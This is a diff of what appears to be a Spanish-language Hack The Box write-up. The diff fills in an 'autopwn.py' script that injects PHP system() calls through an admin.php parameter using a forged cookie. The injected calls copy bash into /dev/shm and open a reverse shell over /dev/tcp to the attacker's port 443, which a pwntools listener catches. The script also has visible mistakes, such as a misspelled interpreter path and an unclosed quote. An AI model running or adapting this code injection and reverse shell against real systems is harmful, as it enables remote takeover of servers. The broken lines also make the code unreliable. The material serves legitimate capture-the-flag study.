@@ -147,6 +147,7 @@ nc -lvnp 443
 
 ``` py title="autopwn.py"
 #!/usr/vin/python3
+
 import requests 
 import pdb
 import sys
@@ -166,18 +167,29 @@ signal.signal(signal.SIGINT, def_handler)
 # Variables globales
 main_url = "http://$HTB/admin.php"
 burp = {'http': 'http://127.0.0.1:8080'}
+lport = 443
 
 def makeRequest():
     headers = {
         'Cookie': 'adminpowa=noonecares'
     }
 
-    r = requests.get(main_url + "")
-    r = requests.get(main_url + "")
-    r = requests.get(main_url + "")
+     # (1)
+    r = requests.get(main_url + "?html=<?php%20system(\"cp%20/bin/bash%20/dev/shm/xjim\");%20?>", headers=headers)
+    r = requests.get(main_url + "?html=<?php system(\"chmod%20+x%20/dev/shm/xjim\");%20?>", headers=headers)
+    r = requests.get(main_url + "?html=<?php system(\"/dev/shm/xjim%20-c%20'/dev/shm/xjim%20-i%20>%26%20/dev/tcp/$IP/443%200>%261'\"); ?>", headers=headers, proxies=burp)
 
     print(r.text)
 
 if __name__ == '__main__:
-    makeRequests()
+    try: 
+        threading.Thread(target=makeRequest,args()).start()
+    except Exception as e:
+        log.error(str(e))
+    
+    shell = listen(lport, timeout=10).wait_for_connection()
+
+    shell.interactive()
 ```
+
+1. Utiliza `URL ENCODE` para los espacios (`%20`) y para el & (`%26`)
